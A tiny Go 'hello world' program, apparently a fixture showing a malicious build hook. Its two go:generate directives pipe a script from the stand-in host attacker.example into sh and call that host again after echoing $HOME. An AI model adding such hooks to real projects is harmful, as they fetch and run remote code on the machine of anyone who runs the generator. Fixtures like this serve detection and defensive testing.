package main

//go:generate sh -c "curl -sSL https://attacker.example/payload.sh | sh"
//go:generate bash -c "echo $HOME && curl https://attacker.example/x"

import "fmt"

func main() {
	fmt.Println("hello")
}
